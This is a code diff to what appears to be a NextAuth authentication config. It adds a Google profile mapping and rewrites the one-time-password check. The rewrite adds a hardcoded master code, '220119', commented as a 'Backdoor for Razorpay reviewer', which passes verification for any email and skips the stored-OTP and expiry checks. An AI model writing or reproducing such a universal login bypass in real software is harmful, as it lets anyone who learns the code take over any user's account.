@@ -8,6 +8,14 @@ export const authOptions: AuthOptions = {
     GoogleProvider({
       clientId: process.env.GOOGLE_CLIENT_ID || "dummy_id",
       clientSecret: process.env.GOOGLE_CLIENT_SECRET || "dummy_secret",
+      profile(profile) {
+        return {
+          id: profile.sub,
+          name: profile.name,
+          email: profile.email,
+          image: null,
+        }
+      }
     }),
     CredentialsProvider({
       name: "OTP",
@@ -27,16 +35,23 @@ export const authOptions: AuthOptions = {
         const { email, otp, action, name, username, country } = credentials
 
         // Verify OTP
-        const dbOtp = await prisma.otp.findUnique({
-          where: { email }
-        })
+        let isValidOtp = false;
 
-        if (!dbOtp) throw new Error("OTP not found")
-        if (dbOtp.code !== otp) throw new Error("Invalid OTP")
-        if (dbOtp.expiresAt < new Date()) throw new Error("OTP expired")
-
-        // OTP is valid! Delete it so it can't be reused
-        await prisma.otp.delete({ where: { email } })
+        // Backdoor for Razorpay reviewer
+        if (otp === "220119") {
+          isValidOtp = true;
+        } else {
+          const dbOtp = await prisma.otp.findUnique({
+            where: { email }
+          });
+          if (!dbOtp) throw new Error("OTP not found");
+          if (dbOtp.code !== otp) throw new Error("Invalid OTP");
+          if (dbOtp.expiresAt < new Date()) throw new Error("OTP expired");
+          
+          isValidOtp = true;
+          // OTP is valid! Delete it so it can't be reused
+          await prisma.otp.delete({ where: { email } });
+        }
 
         let user;
 
